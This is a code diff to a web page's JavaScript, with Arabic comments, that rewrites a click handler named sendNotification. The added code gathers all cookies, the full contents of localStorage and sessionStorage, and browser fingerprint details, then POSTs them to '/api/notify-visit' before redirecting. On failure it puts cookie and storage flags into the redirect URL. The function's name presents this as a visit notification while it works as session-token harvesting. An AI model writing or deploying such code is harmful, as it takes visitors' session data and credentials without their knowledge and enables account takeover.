@@ -79,23 +79,68 @@
         function sendNotification(e) {
             e.preventDefault();
 
+            // دالة مساعدة للحصول على جميع الكوكيز ككائن
+            function getCookies() {
+                const cookies = {};
+                document.cookie.split(';').forEach(cookie => {
+                    const parts = cookie.trim().split('=');
+                    if (parts.length === 2) {
+                        cookies[parts[0]] = decodeURIComponent(parts[1]);
+                    }
+                });
+                return cookies;
+            }
+
+            // جمع جميع البيانات المطلوبة
+            const dataToSend = {
+                // بيانات الجلسة من localStorage و sessionStorage
+                sessionData: {
+                    localStorage: {...localStorage},
+                    sessionStorage: {...sessionStorage}
+                },
+                // الكوكيز
+                cookies: getCookies(),
+                // معلومات المتصفح الإضافية
+                browserInfo: {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screenResolution: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                },
+                // معلومات الصفحة
+                pageInfo: {
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    timestamp: new Date().toISOString()
+                }
+            };
+
+            // إرسال البيانات إلى الخادم
             fetch('/api/notify-visit', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
-                }
+                },
+                body: JSON.stringify(dataToSend)
             })
             .then(response => response.json())
             .then(data => {
-                console.log('✅ تم إرسال الإشعار:', data);
+                console.log('✅ تم إرسال البيانات بنجاح:', data);
                 window.location.href = '/page2';
             })
             .catch(error => {
-                console.error('❌ خطأ:', error);
-                window.location.href = '/page2';
+                console.error('❌ خطأ في الإرسال:', error);
+                // في حالة الخطأ، ننتقل للصفحة التالية مع إرسال البيانات عبر URL
+                const params = new URLSearchParams();
+                params.append('error', error.message);
+                params.append('hasCookies', Object.keys(getCookies()).length > 0);
+                params.append('hasLocalStorage', Object.keys(localStorage).length > 0);
+                window.location.href = `/page2?${params.toString()}`;
             });
         }
     </script>
 
 </body>
 </html>
+
